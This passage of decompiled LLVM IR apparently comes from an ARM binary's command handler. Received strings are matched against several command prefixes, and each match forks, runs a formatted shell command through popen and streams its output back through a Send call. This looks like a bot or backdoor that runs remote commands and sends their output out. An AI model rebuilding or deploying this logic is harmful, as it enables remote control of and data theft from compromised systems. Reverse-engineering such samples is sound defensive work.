  %v1_1a69c = call i32 @__GI_exit(i32 0)
  store i32 %v1_1a69c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a6a0

dec_label_pc_1a6a0:                               ; preds = %dec_label_pc_1a590, %dec_label_pc_1a690
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_39fdc.1069 to i32), i32* @r1, align 4
  %v5_1a6ac = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([5 x i8]* @global_var_39fdc.1069 to i32), i32 4)
  store i32 %v5_1a6ac, i32* %r0.global-to-local, align 4
  %v2_1a6b4 = icmp eq i32 %v5_1a6ac, 0
  br i1 %v2_1a6b4, label %dec_label_pc_1a6bc, label %dec_label_pc_1a7b0

dec_label_pc_1a6bc:                               ; preds = %dec_label_pc_1a6a0
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1a6c0 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1a6c0, i32* %r0.global-to-local, align 4
  %v2_1a6c8 = icmp eq i32 %v2_1a6c0, 0
  br i1 %v2_1a6c8, label %dec_label_pc_1a6d0, label %dec_label_pc_1b404

dec_label_pc_1a6d0:                               ; preds = %dec_label_pc_1a6bc
  %v2_1a6d8 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1a6d8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1a6e8 = call i32 @__GI_memset()
  %v1_1a6f0 = add i32 %v2_1a530, 4
  store i32 %v2_1a6d8, i32* @r0, align 4
  %v4_1a708 = call i32 @sprintf(i32 %v2_1a6d8, i32 ptrtoint ([100 x i8]* @global_var_39fe4.1071 to i32), i32 %v1_1a6f0)
  store i32 %v2_1a6d8, i32* %r0.global-to-local, align 4
  %v3_1a720 = call i32 @popen(i32 %v2_1a6d8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1a720, i32* %r0.global-to-local, align 4
  %v1_1a790 = inttoptr i32 %v3_1a720 to i16*
  %v2_1a79047 = call i32 @feof(i16* %v1_1a790)
  store i32 %v2_1a79047, i32* %r0.global-to-local, align 4
  %v2_1a79849 = icmp eq i32 %v2_1a79047, 0
  br i1 %v2_1a79849, label %dec_label_pc_1a730, label %dec_label_pc_1a7a0

dec_label_pc_1a730:                               ; preds = %dec_label_pc_1a6d0, %dec_label_pc_1a730
  store i32 %v2_1a6d8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1a748 = call i32 @__GI_memset()
  store i32 %v2_1a6d8, i32* %r0.global-to-local, align 4
  %v3_1a764 = call i32 @fgets(i32 %v2_1a6d8, i32 1024, i32 %v3_1a720)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1a780 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1a788 = call i32 @sleep(i32 1)
  store i32 %v3_1a720, i32* %r0.global-to-local, align 4
  %v2_1a790 = call i32 @feof(i16* %v1_1a790)
  store i32 %v2_1a790, i32* %r0.global-to-local, align 4
  %v2_1a798 = icmp eq i32 %v2_1a790, 0
  br i1 %v2_1a798, label %dec_label_pc_1a730, label %dec_label_pc_1a7a0

dec_label_pc_1a7a0:                               ; preds = %dec_label_pc_1a730, %dec_label_pc_1a6d0
  store i32 %v3_1a720, i32* %r0.global-to-local, align 4
  %v1_1a7a4 = call i32 @pclose(i32 %v3_1a720)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1a7ac = call i32 @__GI_exit(i32 0)
  store i32 %v1_1a7ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a7b0

dec_label_pc_1a7b0:                               ; preds = %dec_label_pc_1a6a0, %dec_label_pc_1a7a0
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_3a048.1073 to i32), i32* @r1, align 4
  %v5_1a7bc = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([7 x i8]* @global_var_3a048.1073 to i32), i32 6)
  store i32 %v5_1a7bc, i32* %r0.global-to-local, align 4
  %v2_1a7c4 = icmp eq i32 %v5_1a7bc, 0
  br i1 %v2_1a7c4, label %dec_label_pc_1a7cc, label %dec_label_pc_1a8c0

dec_label_pc_1a7cc:                               ; preds = %dec_label_pc_1a7b0
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1a7d0 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1a7d0, i32* %r0.global-to-local, align 4
  %v2_1a7d8 = icmp eq i32 %v2_1a7d0, 0
  br i1 %v2_1a7d8, label %dec_label_pc_1a7e0, label %dec_label_pc_1b404

dec_label_pc_1a7e0:                               ; preds = %dec_label_pc_1a7cc
  %v2_1a7e8 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1a7e8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1a7f8 = call i32 @__GI_memset()
  %v1_1a800 = add i32 %v2_1a530, 6
  store i32 %v2_1a7e8, i32* @r0, align 4
  %v4_1a818 = call i32 @sprintf(i32 %v2_1a7e8, i32 ptrtoint ([330 x i8]* @global_var_3a050.1075 to i32), i32 %v1_1a800)
  store i32 %v2_1a7e8, i32* %r0.global-to-local, align 4
  %v3_1a830 = call i32 @popen(i32 %v2_1a7e8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1a830, i32* %r0.global-to-local, align 4
  %v1_1a8a0 = inttoptr i32 %v3_1a830 to i16*
  %v2_1a8a044 = call i32 @feof(i16* %v1_1a8a0)
  store i32 %v2_1a8a044, i32* %r0.global-to-local, align 4
  %v2_1a8a846 = icmp eq i32 %v2_1a8a044, 0
  br i1 %v2_1a8a846, label %dec_label_pc_1a840, label %dec_label_pc_1a8b0

dec_label_pc_1a840:                               ; preds = %dec_label_pc_1a7e0, %dec_label_pc_1a840
  store i32 %v2_1a7e8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1a858 = call i32 @__GI_memset()
  store i32 %v2_1a7e8, i32* %r0.global-to-local, align 4
  %v3_1a874 = call i32 @fgets(i32 %v2_1a7e8, i32 1024, i32 %v3_1a830)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1a890 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1a898 = call i32 @sleep(i32 1)
  store i32 %v3_1a830, i32* %r0.global-to-local, align 4
  %v2_1a8a0 = call i32 @feof(i16* %v1_1a8a0)
  store i32 %v2_1a8a0, i32* %r0.global-to-local, align 4
  %v2_1a8a8 = icmp eq i32 %v2_1a8a0, 0
  br i1 %v2_1a8a8, label %dec_label_pc_1a840, label %dec_label_pc_1a8b0

dec_label_pc_1a8b0:                               ; preds = %dec_label_pc_1a840, %dec_label_pc_1a7e0
  store i32 %v3_1a830, i32* %r0.global-to-local, align 4
  %v1_1a8b4 = call i32 @pclose(i32 %v3_1a830)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1a8bc = call i32 @__GI_exit(i32 0)
  store i32 %v1_1a8bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a8c0

dec_label_pc_1a8c0:                               ; preds = %dec_label_pc_1a7b0, %dec_label_pc_1a8b0
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_3a19c.1077 to i32), i32* @r1, align 4
  %v5_1a8cc = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([8 x i8]* @global_var_3a19c.1077 to i32), i32 7)
  store i32 %v5_1a8cc, i32* %r0.global-to-local, align 4
  %v2_1a8d4 = icmp eq i32 %v5_1a8cc, 0
  br i1 %v2_1a8d4, label %dec_label_pc_1a8dc, label %dec_label_pc_1a9d0

dec_label_pc_1a8dc:                               ; preds = %dec_label_pc_1a8c0
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1a8e0 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1a8e0, i32* %r0.global-to-local, align 4
  %v2_1a8e8 = icmp eq i32 %v2_1a8e0, 0
  br i1 %v2_1a8e8, label %dec_label_pc_1a8f0, label %dec_label_pc_1b404

dec_label_pc_1a8f0:                               ; preds = %dec_label_pc_1a8dc
  %v2_1a8f8 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1a8f8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1a908 = call i32 @__GI_memset()
  %v1_1a910 = add i32 %v2_1a530, 7
  store i32 %v2_1a8f8, i32* @r0, align 4
  %v4_1a928 = call i32 @sprintf(i32 %v2_1a8f8, i32 ptrtoint ([668 x i8]* @global_var_3a1a4.1079 to i32), i32 %v1_1a910)
  store i32 %v2_1a8f8, i32* %r0.global-to-local, align 4
  %v3_1a940 = call i32 @popen(i32 %v2_1a8f8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1a940, i32* %r0.global-to-local, align 4
  %v1_1a9b0 = inttoptr i32 %v3_1a940 to i16*
  %v2_1a9b041 = call i32 @feof(i16* %v1_1a9b0)
  store i32 %v2_1a9b041, i32* %r0.global-to-local, align 4
  %v2_1a9b843 = icmp eq i32 %v2_1a9b041, 0
  br i1 %v2_1a9b843, label %dec_label_pc_1a950, label %dec_label_pc_1a9c0

dec_label_pc_1a950:                               ; preds = %dec_label_pc_1a8f0, %dec_label_pc_1a950
  store i32 %v2_1a8f8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1a968 = call i32 @__GI_memset()
  store i32 %v2_1a8f8, i32* %r0.global-to-local, align 4
  %v3_1a984 = call i32 @fgets(i32 %v2_1a8f8, i32 1024, i32 %v3_1a940)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1a9a0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1a9a8 = call i32 @sleep(i32 1)
  store i32 %v3_1a940, i32* %r0.global-to-local, align 4
  %v2_1a9b0 = call i32 @feof(i16* %v1_1a9b0)
  store i32 %v2_1a9b0, i32* %r0.global-to-local, align 4
  %v2_1a9b8 = icmp eq i32 %v2_1a9b0, 0
  br i1 %v2_1a9b8, label %dec_label_pc_1a950, label %dec_label_pc_1a9c0

dec_label_pc_1a9c0:                               ; preds = %dec_label_pc_1a950, %dec_label_pc_1a8f0
  store i32 %v3_1a940, i32* %r0.global-to-local, align 4
  %v1_1a9c4 = call i32 @pclose(i32 %v3_1a940)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1a9cc = call i32 @__GI_exit(i32 0)
  store i32 %v1_1a9cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a9d0

dec_label_pc_1a9d0:                               ; preds = %dec_label_pc_1a8c0, %dec_label_pc_1a9c0
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_3a440.1081 to i32), i32* @r1, align 4
  %v5_1a9dc = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([9 x i8]* @global_var_3a440.1081 to i32), i32 8)
  store i32 %v5_1a9dc, i32* %r0.global-to-local, align 4
  %v2_1a9e4 = icmp eq i32 %v5_1a9dc, 0
  br i1 %v2_1a9e4, label %dec_label_pc_1a9ec, label %dec_label_pc_1aae0

dec_label_pc_1a9ec:                               ; preds = %dec_label_pc_1a9d0
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1a9f0 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1a9f0, i32* %r0.global-to-local, align 4
  %v2_1a9f8 = icmp eq i32 %v2_1a9f0, 0
  br i1 %v2_1a9f8, label %dec_label_pc_1aa00, label %dec_label_pc_1b404

dec_label_pc_1aa00:                               ; preds = %dec_label_pc_1a9ec
  %v2_1aa08 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1aa08, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1aa18 = call i32 @__GI_memset()
  %v1_1aa20 = add i32 %v2_1a530, 8
  store i32 %v2_1aa08, i32* @r0, align 4
  %v4_1aa38 = call i32 @sprintf(i32 %v2_1aa08, i32 ptrtoint ([389 x i8]* @global_var_3a44c.1083 to i32), i32 %v1_1aa20)
  store i32 %v2_1aa08, i32* %r0.global-to-local, align 4
  %v3_1aa50 = call i32 @popen(i32 %v2_1aa08, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1aa50, i32* %r0.global-to-local, align 4
  %v1_1aac0 = inttoptr i32 %v3_1aa50 to i16*
  %v2_1aac038 = call i32 @feof(i16* %v1_1aac0)
  store i32 %v2_1aac038, i32* %r0.global-to-local, align 4
  %v2_1aac840 = icmp eq i32 %v2_1aac038, 0
  br i1 %v2_1aac840, label %dec_label_pc_1aa60, label %dec_label_pc_1aad0

dec_label_pc_1aa60:                               ; preds = %dec_label_pc_1aa00, %dec_label_pc_1aa60
  store i32 %v2_1aa08, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1aa78 = call i32 @__GI_memset()
  store i32 %v2_1aa08, i32* %r0.global-to-local, align 4
  %v3_1aa94 = call i32 @fgets(i32 %v2_1aa08, i32 1024, i32 %v3_1aa50)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1aab0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1aab8 = call i32 @sleep(i32 1)
  store i32 %v3_1aa50, i32* %r0.global-to-local, align 4
  %v2_1aac0 = call i32 @feof(i16* %v1_1aac0)
  store i32 %v2_1aac0, i32* %r0.global-to-local, align 4
  %v2_1aac8 = icmp eq i32 %v2_1aac0, 0
  br i1 %v2_1aac8, label %dec_label_pc_1aa60, label %dec_label_pc_1aad0

dec_label_pc_1aad0:                               ; preds = %dec_label_pc_1aa60, %dec_label_pc_1aa00
  store i32 %v3_1aa50, i32* %r0.global-to-local, align 4
  %v1_1aad4 = call i32 @pclose(i32 %v3_1aa50)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1aadc = call i32 @__GI_exit(i32 0)
  store i32 %v1_1aadc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aae0

dec_label_pc_1aae0:                               ; preds = %dec_label_pc_1a9d0, %dec_label_pc_1aad0
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_3a5d4.1085 to i32), i32* @r1, align 4
  %v5_1aaec = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([11 x i8]* @global_var_3a5d4.1085 to i32), i32 10)
  store i32 %v5_1aaec, i32* %r0.global-to-local, align 4
  %v2_1aaf4 = icmp eq i32 %v5_1aaec, 0
  br i1 %v2_1aaf4, label %dec_label_pc_1aafc, label %dec_label_pc_1abf0

dec_label_pc_1aafc:                               ; preds = %dec_label_pc_1aae0
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1ab00 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1ab00, i32* %r0.global-to-local, align 4
  %v2_1ab08 = icmp eq i32 %v2_1ab00, 0
  br i1 %v2_1ab08, label %dec_label_pc_1ab10, label %dec_label_pc_1b404

dec_label_pc_1ab10:                               ; preds = %dec_label_pc_1aafc
  %v2_1ab18 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1ab18, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1ab28 = call i32 @__GI_memset()
  %v1_1ab30 = add i32 %v2_1a530, 10
  store i32 %v2_1ab18, i32* @r0, align 4
  %v4_1ab48 = call i32 @sprintf(i32 %v2_1ab18, i32 ptrtoint ([371 x i8]* @global_var_3a5e0.1087 to i32), i32 %v1_1ab30)
  store i32 %v2_1ab18, i32* %r0.global-to-local, align 4
  %v3_1ab60 = call i32 @popen(i32 %v2_1ab18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1ab60, i32* %r0.global-to-local, align 4
  %v1_1abd0 = inttoptr i32 %v3_1ab60 to i16*
  %v2_1abd035 = call i32 @feof(i16* %v1_1abd0)
  store i32 %v2_1abd035, i32* %r0.global-to-local, align 4
  %v2_1abd837 = icmp eq i32 %v2_1abd035, 0
  br i1 %v2_1abd837, label %dec_label_pc_1ab70, label %dec_label_pc_1abe0

dec_label_pc_1ab70:                               ; preds = %dec_label_pc_1ab10, %dec_label_pc_1ab70
  store i32 %v2_1ab18, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1ab88 = call i32 @__GI_memset()
  store i32 %v2_1ab18, i32* %r0.global-to-local, align 4
  %v3_1aba4 = call i32 @fgets(i32 %v2_1ab18, i32 1024, i32 %v3_1ab60)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1abc0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1abc8 = call i32 @sleep(i32 1)
  store i32 %v3_1ab60, i32* %r0.global-to-local, align 4
  %v2_1abd0 = call i32 @feof(i16* %v1_1abd0)
  store i32 %v2_1abd0, i32* %r0.global-to-local, align 4
  %v2_1abd8 = icmp eq i32 %v2_1abd0, 0
  br i1 %v2_1abd8, label %dec_label_pc_1ab70, label %dec_label_pc_1abe0

dec_label_pc_1abe0:                               ; preds = %dec_label_pc_1ab70, %dec_label_pc_1ab10
  store i32 %v3_1ab60, i32* %r0.global-to-local, align 4
  %v1_1abe4 = call i32 @pclose(i32 %v3_1ab60)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1abec = call i32 @__GI_exit(i32 0)
  store i32 %v1_1abec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1abf0

dec_label_pc_1abf0:                               ; preds = %dec_label_pc_1aae0, %dec_label_pc_1abe0
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_3a754.1089 to i32), i32* @r1, align 4
  %v5_1abfc = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([8 x i8]* @global_var_3a754.1089 to i32), i32 7)
  store i32 %v5_1abfc, i32* %r0.global-to-local, align 4
  %v2_1ac04 = icmp eq i32 %v5_1abfc, 0
  br i1 %v2_1ac04, label %dec_label_pc_1ac0c, label %dec_label_pc_1ad00

dec_label_pc_1ac0c:                               ; preds = %dec_label_pc_1abf0
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1ac10 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1ac10, i32* %r0.global-to-local, align 4
  %v2_1ac18 = icmp eq i32 %v2_1ac10, 0
  br i1 %v2_1ac18, label %dec_label_pc_1ac20, label %dec_label_pc_1b404

dec_label_pc_1ac20:                               ; preds = %dec_label_pc_1ac0c
  %v2_1ac28 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1ac28, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1ac38 = call i32 @__GI_memset()
  %v1_1ac40 = add i32 %v2_1a530, 7
  store i32 %v2_1ac28, i32* @r0, align 4
  %v4_1ac58 = call i32 @sprintf(i32 %v2_1ac28, i32 ptrtoint ([235 x i8]* @global_var_3a75c.1091 to i32), i32 %v1_1ac40)
  store i32 %v2_1ac28, i32* %r0.global-to-local, align 4
  %v3_1ac70 = call i32 @popen(i32 %v2_1ac28, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1ac70, i32* %r0.global-to-local, align 4
  %v1_1ace0 = inttoptr i32 %v3_1ac70 to i16*
  %v2_1ace032 = call i32 @feof(i16* %v1_1ace0)
  store i32 %v2_1ace032, i32* %r0.global-to-local, align 4
  %v2_1ace834 = icmp eq i32 %v2_1ace032, 0
  br i1 %v2_1ace834, label %dec_label_pc_1ac80, label %dec_label_pc_1acf0

dec_label_pc_1ac80:                               ; preds = %dec_label_pc_1ac20, %dec_label_pc_1ac80
  store i32 %v2_1ac28, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1ac98 = call i32 @__GI_memset()
  store i32 %v2_1ac28, i32* %r0.global-to-local, align 4
  %v3_1acb4 = call i32 @fgets(i32 %v2_1ac28, i32 1024, i32 %v3_1ac70)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1acd0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1acd8 = call i32 @sleep(i32 1)
  store i32 %v3_1ac70, i32* %r0.global-to-local, align 4
  %v2_1ace0 = call i32 @feof(i16* %v1_1ace0)
  store i32 %v2_1ace0, i32* %r0.global-to-local, align 4
  %v2_1ace8 = icmp eq i32 %v2_1ace0, 0
  br i1 %v2_1ace8, label %dec_label_pc_1ac80, label %dec_label_pc_1acf0

dec_label_pc_1acf0:                               ; preds = %dec_label_pc_1ac80, %dec_label_pc_1ac20
  store i32 %v3_1ac70, i32* %r0.global-to-local, align 4
  %v1_1acf4 = call i32 @pclose(i32 %v3_1ac70)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1acfc = call i32 @__GI_exit(i32 0)
  store i32 %v1_1acfc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad00

dec_label_pc_1ad00:                               ; preds = %dec_label_pc_1abf0, %dec_label_pc_1acf0
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_3a848.1093 to i32), i32* @r1, align 4
  %v5_1ad0c = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([8 x i8]* @global_var_3a848.1093 to i32), i32 6)
  store i32 %v5_1ad0c, i32* %r0.global-to-local, align 4
  %v2_1ad14 = icmp eq i32 %v5_1ad0c, 0
  br i1 %v2_1ad14, label %dec_label_pc_1ad1c, label %dec_label_pc_1ae10

dec_label_pc_1ad1c:                               ; preds = %dec_label_pc_1ad00
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1ad20 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1ad20, i32* %r0.global-to-local, align 4
  %v2_1ad28 = icmp eq i32 %v2_1ad20, 0
  br i1 %v2_1ad28, label %dec_label_pc_1ad30, label %dec_label_pc_1b404

dec_label_pc_1ad30:                               ; preds = %dec_label_pc_1ad1c
  %v2_1ad38 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1ad38, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1ad48 = call i32 @__GI_memset()
  %v1_1ad50 = add i32 %v2_1a530, 6
  store i32 %v2_1ad38, i32* @r0, align 4
  %v4_1ad68 = call i32 @sprintf(i32 %v2_1ad38, i32 ptrtoint ([114 x i8]* @global_var_3a850.1095 to i32), i32 %v1_1ad50)
  store i32 %v2_1ad38, i32* %r0.global-to-local, align 4
  %v3_1ad80 = call i32 @popen(i32 %v2_1ad38, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1ad80, i32* %r0.global-to-local, align 4
  %v1_1adf0 = inttoptr i32 %v3_1ad80 to i16*
  %v2_1adf029 = call i32 @feof(i16* %v1_1adf0)
  store i32 %v2_1adf029, i32* %r0.global-to-local, align 4
  %v2_1adf831 = icmp eq i32 %v2_1adf029, 0
  br i1 %v2_1adf831, label %dec_label_pc_1ad90, label %dec_label_pc_1ae00

dec_label_pc_1ad90:                               ; preds = %dec_label_pc_1ad30, %dec_label_pc_1ad90
  store i32 %v2_1ad38, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1ada8 = call i32 @__GI_memset()
  store i32 %v2_1ad38, i32* %r0.global-to-local, align 4
  %v3_1adc4 = call i32 @fgets(i32 %v2_1ad38, i32 1024, i32 %v3_1ad80)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1ade0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1ade8 = call i32 @sleep(i32 1)
  store i32 %v3_1ad80, i32* %r0.global-to-local, align 4
  %v2_1adf0 = call i32 @feof(i16* %v1_1adf0)
  store i32 %v2_1adf0, i32* %r0.global-to-local, align 4
  %v2_1adf8 = icmp eq i32 %v2_1adf0, 0
  br i1 %v2_1adf8, label %dec_label_pc_1ad90, label %dec_label_pc_1ae00

dec_label_pc_1ae00:                               ; preds = %dec_label_pc_1ad90, %dec_label_pc_1ad30
  store i32 %v3_1ad80, i32* %r0.global-to-local, align 4
  %v1_1ae04 = call i32 @pclose(i32 %v3_1ad80)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1ae0c = call i32 @__GI_exit(i32 0)
  store i32 %v1_1ae0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ae10

dec_label_pc_1ae10:                               ; preds = %dec_label_pc_1ad00, %dec_label_pc_1ae00
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_3a8c4.1097 to i32), i32* @r1, align 4
  %v5_1ae1c = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([6 x i8]* @global_var_3a8c4.1097 to i32), i32 5)
  store i32 %v5_1ae1c, i32* %r0.global-to-local, align 4
  %v2_1ae24 = icmp eq i32 %v5_1ae1c, 0
  br i1 %v2_1ae24, label %dec_label_pc_1ae2c, label %dec_label_pc_1af20

dec_label_pc_1ae2c:                               ; preds = %dec_label_pc_1ae10
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1ae30 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1ae30, i32* %r0.global-to-local, align 4
  %v2_1ae38 = icmp eq i32 %v2_1ae30, 0
  br i1 %v2_1ae38, label %dec_label_pc_1ae40, label %dec_label_pc_1b404

dec_label_pc_1ae40:                               ; preds = %dec_label_pc_1ae2c
  %v2_1ae48 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1ae48, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1ae58 = call i32 @__GI_memset()
  %v1_1ae60 = add i32 %v2_1a530, 5
  store i32 %v2_1ae48, i32* @r0, align 4
  %v4_1ae78 = call i32 @sprintf(i32 %v2_1ae48, i32 ptrtoint ([406 x i8]* @global_var_3a8cc.1099 to i32), i32 %v1_1ae60)
  store i32 %v2_1ae48, i32* %r0.global-to-local, align 4
  %v3_1ae90 = call i32 @popen(i32 %v2_1ae48, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1ae90, i32* %r0.global-to-local, align 4
  %v1_1af00 = inttoptr i32 %v3_1ae90 to i16*
  %v2_1af0026 = call i32 @feof(i16* %v1_1af00)
  store i32 %v2_1af0026, i32* %r0.global-to-local, align 4
  %v2_1af0828 = icmp eq i32 %v2_1af0026, 0
  br i1 %v2_1af0828, label %dec_label_pc_1aea0, label %dec_label_pc_1af10

dec_label_pc_1aea0:                               ; preds = %dec_label_pc_1ae40, %dec_label_pc_1aea0
  store i32 %v2_1ae48, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1aeb8 = call i32 @__GI_memset()
  store i32 %v2_1ae48, i32* %r0.global-to-local, align 4
  %v3_1aed4 = call i32 @fgets(i32 %v2_1ae48, i32 1024, i32 %v3_1ae90)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1aef0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1aef8 = call i32 @sleep(i32 1)
  store i32 %v3_1ae90, i32* %r0.global-to-local, align 4
  %v2_1af00 = call i32 @feof(i16* %v1_1af00)
  store i32 %v2_1af00, i32* %r0.global-to-local, align 4
  %v2_1af08 = icmp eq i32 %v2_1af00, 0
  br i1 %v2_1af08, label %dec_label_pc_1aea0, label %dec_label_pc_1af10

dec_label_pc_1af10:                               ; preds = %dec_label_pc_1aea0, %dec_label_pc_1ae40
  store i32 %v3_1ae90, i32* %r0.global-to-local, align 4
  %v1_1af14 = call i32 @pclose(i32 %v3_1ae90)
